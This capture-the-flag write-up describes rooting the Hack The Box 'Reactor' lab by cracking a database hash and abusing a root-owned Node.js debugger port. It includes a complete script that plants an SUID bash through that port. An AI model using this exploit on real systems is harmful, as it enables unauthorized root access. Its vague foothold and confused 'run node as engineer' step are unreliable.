# Hack The Box - Reactor Writeup

**Target Machine:** Reactor

**OS:** Linux

**Difficulty:** Easy

**Target IP:** `[TARGET_IP]`

**Attacker IP:** `[ATTACKER_IP]` (`tun0`)

---

## 1. Initial Foothold & Enumeration

An initial comprehensive port scan was conducted using `nmap` to discover active network services running on the **Reactor** machine:

```bash
nmap -sC -sV -p- [TARGET_IP]

```

### From Web Exploitation to Database Cracking

During the initial web enumeration phase, a vulnerability or misconfiguration was leveraged to discover and extract a database file named `reactor.db` via a web application component or directory traversal.

Upon auditing the database contents, an encrypted password hash associated with the user accounts was recovered. The hash was cracked offline using standard wordlists (e.g., `rockyou.txt`), yielding the cleartext credentials for the system operator:

* **User:** `engineer`
* **Password:** `reactor1`

Using these credentials, an interactive remote session was established over SSH directly to `reactor.htb`:

```bash
ssh engineer@[TARGET_IP]

```

After authenticating successfully, the initial user flag was obtained from the home directory:

```bash
engineer@reactor:~$ cat user.txt
[USER_FLAG_REDACTED]

```

---

## 2. Privilege Escalation via Node.js Inspector

### Vulnerability Background (Internal Enumeration)

When auditing the internal environment of the **Reactor** machine, running local services can be examined via `ss -lntp` or `netstat -antp`. This system ran a background process exposing port **`9229`** bound exclusively to the loopback interface (`127.0.0.1`), which is the default port for the **Node.js V8 Inspector (Debugging)**.

Alternatively, if a high-privilege interactive Node process is triggered or available to user `engineer`, it can be launched manually into a listening state using the `--inspect-brk` flag. This initializes the V8 Inspector engine and pauses execution at the first line, waiting for an external debugger to hook into it:

```bash
engineer@reactor:~$ node --inspect-brk=0 -e "require('child_process').execSync('cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash')"

```

The terminal output confirms that the debugger is actively listening locally on **Reactor**:

```text
Debugger listening on ws://127.0.0.1:42109/[UUID]
For help, see: https://nodejs.org/en/docs/inspector

```

Because the underlying Node.js process runs under root privileges, any client that attaches to this debugging interface can evaluate arbitrary JavaScript to execute system commands with root authority (Remote Code Execution - RCE).

### Setting Up SSH Port Forwarding

Since the debug port only accepts connections originating from localhost on the target machine, an SSH tunnel must be built from the local attack machine (`CayCon`) to forward the remote debug port local to our attacking environment:

```bash
CC@CC:~$ ssh -L 9229:127.0.0.1:9229 engineer@[TARGET_IP]

```

---

## 3. Exploit Execution & Root Shell

### Automated Script Interaction (`chrome-remote-interface`)

If you prefer an automated approach or need to bypass an environment where the interactive Node CLI client is unavailable, you can write a standalone automation script on your attack machine. This method uses the Chrome DevTools Protocol (CDP) via the `chrome-remote-interface` library to programmatically connect to the forwarded port, inject the payload, and parse the output.

#### 1. Environment Preparation

Before creating the script, initialize a project folder on your local machine (`CayCon`) and install the required library package using `npm`:

```bash
CC@CC:~$ mkdir reactor-exploit && cd reactor-exploit
CC@CC:~/reactor-exploit$ npm install chrome-remote-interface

```

#### 2. Crafting the Automation Script

Create a new file named `privEsc.js` using your preferred text editor (e.g., `nano privEsc.js`) and paste the following implementation:

```javascript
const CDP = require('chrome-remote-interface');

async function pwn() {
    let client;
    try {
        // Connects to the local port forwarded from the target via SSH tunnel
        client = await CDP({ port: 9229 }); 
        const { Runtime } = client;
  
        // Payload string to be evaluated inside the V8 engine context
        const codeToExecute = `
            (() => {
                try {
                    // Resolve the process global context safely across different Node environments
                    const proc = typeof process !== 'undefined' ? process : global.process;
                    if (!proc) return 'Error: process object is unavailable';
                    
                    // Locate the core module loader and require 'child_process'
                    const req = proc.mainModule ? proc.mainModule.require : module.require;
                    const cp = req('child_process');
                    
                    // Execution Payload: Duplicates bash to /tmp and sets the SUID permission bit
                    cp.execSync('cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash');
                    return 'SUID shell created successfully at /tmp/rootbash';
                    
                } catch (err) {
                    return 'Payload Error: ' + err.message;
                }
            })()
        `;

        // Send the payload string to the exposed runtime interpreter
        const response = await Runtime.evaluate({ 
            expression: codeToExecute, 
            returnByValue: true 
        });

        // Error and output handling
        if (response.exceptionDetails) {
            console.error('Debugger Error Exception:', response.exceptionDetails.exception.description);
        } else {
            console.log('\n--- Remote Execution Result ---');
            console.log(response.result.value);
            console.log('--------------------------------\n');
        }

    } catch (err) {
        console.error('Connection Connection Error:', err.message);
    } finally {
        // Cleanly close the WebSocket connection to the debugger
        if (client) { 
            await client.close(); 
        }
    }
}

pwn();

```

#### 3. Execution and Triggering the Payload

With your SSH port-forwarding tunnel active in another window, fire the script from your local terminal:

```bash
CC@CC:~/reactor-exploit$ node privEsc.js

```

Upon a successful handshake and payload parsing, the script will query the target's V8 engine and return the evaluation statement directly to your screen:

```text
--- Remote Execution Result ---
SUID shell created successfully at /tmp/rootbash
--------------------------------

```

This confirms that the high-privilege Node process has written an elevated, permanent binary onto the target's filesystem, setting up the final stage of privilege escalation.

---

## 4. Spawning the Interactive Root Shell

Once the payload executes successfully via the automated script, a persistent SUID binary is generated inside the `/tmp` folder of the **Reactor** machine.

Return to the active SSH shell as `engineer` and execute the binary using the `-p` (preserve privileges) flag. This flag is critical because modern implementations of `bash` drop effective privileges automatically when running from an SUID binary unless explicitly preserved:

```bash
engineer@reactor:~$ /tmp/rootbash -p
rootbash-5.2# whoami
root

```

With complete control of the machine established, the final flag was retrieved from the root directory:

```bash
rootbash-5.2# cat /root/root.txt
[ROOT_FLAG_REDACTED]

```
